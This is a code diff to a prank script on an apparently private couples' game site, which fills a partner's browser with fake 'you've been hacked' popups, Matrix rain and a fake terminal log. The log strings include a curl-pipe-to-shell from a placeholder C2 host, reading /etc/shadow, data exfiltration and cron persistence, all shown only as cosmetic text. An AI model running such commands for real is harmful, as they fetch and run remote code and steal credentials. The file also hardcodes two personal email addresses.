@@ -2,7 +2,8 @@
 // Eingebunden auf allen Spiel-Seiten AUSSER marienkaefer/aquarium/zombiedefense.
 // Hoert auf boosters/{userKey}/active_spam und spammt das Opfer waehrend der
 // Hack-Dauer mit nervigen "gehacktes Terminal"-Popups zu – egal auf welcher
-// Seite es sich gerade befindet. Immer nur EIN Popup gleichzeitig.
+// Seite es sich gerade befindet. Mehrere Popups gleichzeitig, Matrix-Regen,
+// Typewriter-Text, Fake-Terminal-Log und ein Live-Countdown pro Popup.
 
 import { getApps, getApp, initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
 import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
@@ -23,12 +24,16 @@ const db   = getDatabase(app);
 const auth = getAuth(app);
 
 // ---- Konstanten (leicht justierbar) ----
-const SPAWN_MIN     = 4000;   // min. Abstand bis zum naechsten Popup
-const SPAWN_MAX     = 7000;   // max. Abstand bis zum naechsten Popup
-const FIRST_DELAY   = 800;    // Verzoegerung bis zum ersten Popup
+const SPAWN_MIN     = 900;    // min. Abstand bis zum naechsten Popup
+const SPAWN_MAX     = 2000;   // max. Abstand bis zum naechsten Popup
+const FIRST_DELAY   = 500;    // Verzoegerung bis zum ersten Popup
 const CLOSE_LOCK    = 1500;   // "Schliessen"-Knopf erst danach aktiv
 const DODGE         = true;   // Schliessen-Knopf weicht beim 1. Klick aus
 const DEFAULT_DUR   = 90000;
+const MAX_POPUPS    = 10;     // Soft-Cap, damit der Browser nicht einfriert
+const TYPE_SPEED    = 22;     // ms pro Zeichen (Typewriter)
+const LOG_INTERVAL  = 750;    // ms zwischen Fake-Log-Zeilen
+const LOG_MAX_LINES = 30;     // max. Zeilen im Fake-Log
 
 const MESSAGES = [
   "💻 SYSTEM KOMPROMITTIERT — Zugriff durch {from}@root",
@@ -43,6 +48,24 @@ const MESSAGES = [
   "⌨️ Keylogger aktiv: letzter Klick um {zeit} protokolliert",
 ];
 
+const LOG_LINES = [
+  "> nmap -p- {ip} … open: 22,80,443",
+  "> ssh {from}@{ip} -p 22 … auth bypass ok",
+  "> scp /momente/*.jpg → {from}@exfil",
+  "[####------] {pct}% cracking sha256 …",
+  "[######----] {pct}% bruteforce wifi …",
+  "[ok] payload injected (pid {n})",
+  "> tail -f /var/log/love.log",
+  "> cat /etc/shadow | grep {from}",
+  "> curl -s http://{ip}/c2 | sh",
+  "[!] keylogger hook attached → tty{n}",
+  "> dd if=/dev/herz of=/dev/{from}",
+  "[ok] persistence: cron @reboot installed",
+  "> netstat -tulpn … 1 backdoor listening",
+  "[######### ] {pct}% uploading screenshots …",
+  "> gpg --decrypt momente.vault … success",
+];
+
 function displayName(email) {
   if (email.toLowerCase() === 'raederich@outlook.com') return 'Andreas';
   if (email.toLowerCase() === 'nele.busse@web.de')     return 'Nele';
@@ -54,10 +77,23 @@ function isActive(d) {
   return Date.now() < d.activatedAt + (d.durationMs || DEFAULT_DUR);
 }
 
+function endTime(d) {
+  if (!d || !d.activatedAt) return 0;
+  return d.activatedAt + (d.durationMs || DEFAULT_DUR);
+}
+
 function fillMsg(tpl, from) {
   return tpl
     .replace(/\{from\}/g, from || 'Hacker')
     .replace(/\{zeit\}/g, new Date().toLocaleTimeString('de-DE'));
+}
+
+function fillLog(tpl, from) {
+  return tpl
+    .replace(/\{from\}/g, (from || 'hacker').toLowerCase())
+    .replace(/\{ip\}/g,   `10.0.${(Math.random()*255)|0}.${(Math.random()*255)|0}`)
+    .replace(/\{pct\}/g,  String(10 + ((Math.random()*89)|0)))
+    .replace(/\{n\}/g,    String(1000 + ((Math.random()*8999)|0)));
 }
 
 // ---- CSS einmalig injizieren ----
@@ -66,60 +102,136 @@ function injectStyle() {
   const s = document.createElement('style');
   s.id = 'spamhack-style';
   s.textContent = `
-  .spamhack-backdrop{position:fixed;inset:0;background:rgba(0,8,4,.55);
-    z-index:2147483600;display:flex;align-items:center;justify-content:center;}
+  .spamhack-matrix{position:fixed;inset:0;z-index:2147483590;
+    pointer-events:none;opacity:.55;}
+  .spamhack-backdrop{position:fixed;inset:0;background:rgba(0,8,4,.35);
+    z-index:2147483600;pointer-events:none;}
   .spamhack-win{position:absolute;width:min(360px,90vw);
     background:#0a0e12;border:2px solid #1f7a3a;border-radius:8px;
     box-shadow:0 0 0 2px #000,0 0 26px rgba(34,255,120,.45);
     font-family:'Courier New',monospace;color:#7CFC9A;overflow:hidden;
+    pointer-events:auto;
     animation:spamhack-pop .18s ease-out, spamhack-glitch 1.6s steps(2) infinite;}
   .spamhack-bar{display:flex;align-items:center;gap:7px;padding:7px 10px;
     background:#11151b;border-bottom:1px solid #1f7a3a;font-size:12px;color:#9aa;}
   .spamhack-dot{width:10px;height:10px;border-radius:50%;background:#ff3b3b;
     box-shadow:0 0 6px #ff3b3b;}
-  .spamhack-body{padding:18px 16px 16px;font-size:14px;line-height:1.55;
-    text-shadow:0 0 4px rgba(124,252,154,.6);}
+  .spamhack-body{padding:16px 16px 8px;font-size:14px;line-height:1.55;
+    text-shadow:0 0 4px rgba(124,252,154,.6);min-height:1.2em;}
   .spamhack-body::after{content:'_';animation:spamhack-blink 1s steps(1) infinite;}
+  .spamhack-body.done::after{content:'';}
+  .spamhack-log{margin:0 14px;padding:6px 8px;background:#05080a;
+    border:1px solid #14391f;border-radius:4px;font-size:11px;line-height:1.5;
+    color:#4fae6e;max-height:90px;overflow:hidden;white-space:pre-wrap;
+    word-break:break-all;}
+  .spamhack-timer{margin:12px 14px 0;padding:7px;text-align:center;
+    border:1px dashed #c9a227;border-radius:4px;font-size:13px;
+    font-weight:bold;color:#ffd24a;background:rgba(120,90,0,.18);
+    text-shadow:0 0 6px rgba(255,210,74,.7);
+    animation:spamhack-pulse 1s ease-in-out infinite;}
   .spamhack-scan{position:absolute;inset:0;pointer-events:none;
     background:repeating-linear-gradient(0deg,rgba(0,0,0,.18) 0 1px,transparent 1px 3px);}
-  .spamhack-close{display:block;width:100%;margin-top:14px;padding:9px;
-    background:#161b22;color:#ff6b6b;border:1px solid #7a1f1f;border-radius:5px;
-    font-family:'Courier New',monospace;font-size:13px;cursor:not-allowed;
-    opacity:.55;transition:left .1s,top .1s;}
+  .spamhack-close{display:block;width:calc(100% - 28px);margin:12px 14px 14px;
+    padding:9px;background:#161b22;color:#ff6b6b;border:1px solid #7a1f1f;
+    border-radius:5px;font-family:'Courier New',monospace;font-size:13px;
+    cursor:not-allowed;opacity:.55;transition:left .1s,top .1s;}
   .spamhack-close.ready{cursor:pointer;opacity:1;color:#7CFC9A;
     border-color:#1f7a3a;}
   .spamhack-shake{animation:spamhack-shake .3s linear;}
   @keyframes spamhack-pop{from{transform:scale(.7);opacity:0}to{transform:scale(1);opacity:1}}
   @keyframes spamhack-blink{50%{opacity:0}}
+  @keyframes spamhack-pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
   @keyframes spamhack-glitch{0%,92%,100%{filter:none}94%{filter:hue-rotate(60deg) contrast(1.4)}96%{filter:invert(.15)}}
   @keyframes spamhack-shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-7px)}75%{transform:translateX(7px)}}
   `;
   document.head.appendChild(s);
 }
 
-// ---- Popup-Logik (max. 1 gleichzeitig) ----
+// ---- Matrix-Regen (global, ein Canvas pro Lauf) ----
+let matrixCanvas = null;
+let matrixRaf    = null;
+let matrixCols   = [];
+const MATRIX_CHARS = 'アイウエオカキクケコサシスセソタチツテト0123456789ABCDEF#$%&';
+
+function onMatrixResize() {
+  if (!matrixCanvas) return;
+  matrixCanvas.width  = window.innerWidth;
+  matrixCanvas.height = window.innerHeight;
+  const cols = Math.ceil(matrixCanvas.width / 16);
+  matrixCols = new Array(cols).fill(0).map(() => Math.random() * -50 | 0);
+}
+
+function startMatrix() {
+  if (matrixCanvas) return;
+  injectStyle();
+  matrixCanvas = document.createElement('canvas');
+  matrixCanvas.className = 'spamhack-matrix';
+  document.body.appendChild(matrixCanvas);
+  onMatrixResize();
+  window.addEventListener('resize', onMatrixResize);
+  const ctx = matrixCanvas.getContext('2d');
+  const draw = () => {
+    ctx.fillStyle = 'rgba(0,8,4,.10)';
+    ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+    ctx.fillStyle = '#39ff86';
+    ctx.font = '15px monospace';
+    for (let i = 0; i < matrixCols.length; i++) {
+      const ch = MATRIX_CHARS[(Math.random() * MATRIX_CHARS.length) | 0];
+      const x = i * 16;
+      const y = matrixCols[i] * 16;
+      ctx.fillText(ch, x, y);
+      if (y > matrixCanvas.height && Math.random() > 0.975) matrixCols[i] = 0;
+      else matrixCols[i]++;
+    }
+    matrixRaf = requestAnimationFrame(draw);
+  };
+  matrixRaf = requestAnimationFrame(draw);
+}
+
+function stopMatrix() {
+  if (matrixRaf) { cancelAnimationFrame(matrixRaf); matrixRaf = null; }
+  window.removeEventListener('resize', onMatrixResize);
+  if (matrixCanvas) { matrixCanvas.remove(); matrixCanvas = null; }
+  matrixCols = [];
+}
+
+// ---- Popup-Logik (mehrere gleichzeitig) ----
 let userKey      = null;
 let spamData     = null;
 let running      = false;
-let currentEl    = null;
+let popups       = new Set();
 let nextTimeout  = null;
 let endTimeout   = null;
+let firstTimeout = null;
 
 function clearTimers() {
-  if (nextTimeout) { clearTimeout(nextTimeout); nextTimeout = null; }
-  if (endTimeout)  { clearTimeout(endTimeout);  endTimeout  = null; }
+  if (nextTimeout)  { clearTimeout(nextTimeout);  nextTimeout  = null; }
+  if (endTimeout)   { clearTimeout(endTimeout);   endTimeout   = null; }
+  if (firstTimeout) { clearTimeout(firstTimeout); firstTimeout = null; }
 }
 
-function removeCurrent() {
-  if (currentEl) { currentEl.remove(); currentEl = null; }
+function destroyPopup(backdrop) {
+  if (!backdrop) return;
+  const timers = backdrop._spamTimers || [];
+  timers.forEach(t => { clearInterval(t); clearTimeout(t); });
+  backdrop.remove();
+  popups.delete(backdrop);
+}
+
+function removeAll() {
+  Array.from(popups).forEach(destroyPopup);
+  popups.clear();
 }
 
 function scheduleNext() {
-  if (!running || currentEl) return;
+  if (!running) return;
+  if (nextTimeout) return;
   const delay = SPAWN_MIN + Math.random() * (SPAWN_MAX - SPAWN_MIN);
   nextTimeout = setTimeout(() => {
+    nextTimeout = null;
     if (!running || !isActive(spamData)) return;
     spawn(fillMsg(MESSAGES[Math.floor(Math.random() * MESSAGES.length)], spamData && spamData.from));
+    scheduleNext();
   }, delay);
 }
 
@@ -132,11 +244,14 @@ function placeWin(win) {
 }
 
 function spawn(text) {
-  if (currentEl) return; // nie mehr als eins
+  if (popups.size >= MAX_POPUPS) return; // Browser nicht einfrieren
   injectStyle();
+
+  const from = spamData && spamData.from;
 
   const backdrop = document.createElement('div');
   backdrop.className = 'spamhack-backdrop';
+  backdrop._spamTimers = [];
 
   const win = document.createElement('div');
   win.className = 'spamhack-win';
@@ -146,19 +261,54 @@ function spawn(text) {
       <span>root@nele-und-andreas: ~/exploit</span>
     </div>
     <div class="spamhack-body"></div>
+    <div class="spamhack-log"></div>
+    <div class="spamhack-timer">⏳ …</div>
     <div class="spamhack-scan"></div>`;
-  win.querySelector('.spamhack-body').textContent = text;
+
+  const body  = win.querySelector('.spamhack-body');
+  const logEl = win.querySelector('.spamhack-log');
+  const timer = win.querySelector('.spamhack-timer');
 
   const close = document.createElement('button');
   close.className = 'spamhack-close';
-  win.querySelector('.spamhack-body').after(close);
+  win.querySelector('.spamhack-scan').before(close);
 
   backdrop.appendChild(win);
   document.body.appendChild(backdrop);
-  currentEl = backdrop;
+  popups.add(backdrop);
   placeWin(win);
 
-  if (navigator.vibrate) { try { navigator.vibrate(200); } catch (_) {} }
+  if (navigator.vibrate) { try { navigator.vibrate(120); } catch (_) {} }
+
+  // Typewriter-Text
+  let ti = 0;
+  const typer = setInterval(() => {
+    body.textContent = text.slice(0, ++ti);
+    if (ti >= text.length) { clearInterval(typer); body.classList.add('done'); }
+  }, TYPE_SPEED);
+  backdrop._spamTimers.push(typer);
+
+  // Fake-Terminal-Log
+  const logTick = setInterval(() => {
+    const line = fillLog(LOG_LINES[(Math.random() * LOG_LINES.length) | 0], from);
+    const div = document.createElement('div');
+    div.textContent = line;
+    logEl.appendChild(div);
+    while (logEl.childElementCount > LOG_MAX_LINES) logEl.firstElementChild.remove();
+    logEl.scrollTop = logEl.scrollHeight;
+  }, LOG_INTERVAL);
+  backdrop._spamTimers.push(logTick);
+
+  // Live-Countdown der Angriffsdauer
+  const renderTimer = () => {
+    const left = Math.max(0, Math.ceil((endTime(spamData) - Date.now()) / 1000));
+    timer.textContent = left > 0
+      ? `⏳ Angriff endet in ${left}s`
+      : '⛔ Verbindung wird gekappt …';
+  };
+  renderTimer();
+  const timerTick = setInterval(renderTimer, 1000);
+  backdrop._spamTimers.push(timerTick);
 
   // Fake-Countdown, dann erst schliessbar
   let left = Math.ceil(CLOSE_LOCK / 1000);
@@ -167,19 +317,19 @@ function spawn(text) {
     left--;
     if (left > 0) { close.textContent = `[ Schließen in ${left} ]`; }
   }, 1000);
-  setTimeout(() => {
+  backdrop._spamTimers.push(cd);
+  const unlock = setTimeout(() => {
     clearInterval(cd);
     close.classList.add('ready');
     close.textContent = '[ ✕ Verbindung trennen ]';
   }, CLOSE_LOCK);
+  backdrop._spamTimers.push(unlock);
 
   let dodged = false;
   close.addEventListener('click', () => {
     if (!close.classList.contains('ready')) return;
     if (DODGE && !dodged) { dodged = true; placeWin(win); return; }
-    clearInterval(cd);
-    removeCurrent();
-    if (running && isActive(spamData)) scheduleNext();
+    destroyPopup(backdrop);
   });
 
   // Klick irgendwo ins Fenster (nicht der Knopf) -> nur nerviges Wackeln
@@ -194,29 +344,32 @@ function spawn(text) {
 function startRun() {
   running = true;
   clearTimers();
-  removeCurrent();
+  removeAll();
+  startMatrix();
   const from = spamData && spamData.from;
   const dur  = (spamData && spamData.durationMs) || DEFAULT_DUR;
   const secs = Math.round(dur / 1000);
-  setTimeout(() => {
+  firstTimeout = setTimeout(() => {
+    firstTimeout = null;
     if (running && isActive(spamData)) {
       spawn(`💻 ${from || 'Jemand'} hat dich gehackt. Verbindung getrennt erst in ${secs}s 😈`);
+      scheduleNext();
     }
   }, FIRST_DELAY);
-  const remaining = (spamData.activatedAt + dur) - Date.now();
-  endTimeout = setTimeout(stopRun, Math.max(0, remaining));
+  endTimeout = setTimeout(stopRun, Math.max(0, endTime(spamData) - Date.now()));
 }
 
 function stopRun() {
   running = false;
   clearTimers();
-  removeCurrent();
+  removeAll();
+  stopMatrix();
 }
 
 function sync() {
   if (isActive(spamData)) {
     if (!running) startRun();
-  } else if (running || currentEl) {
+  } else if (running || popups.size) {
     stopRun();
   }
 }
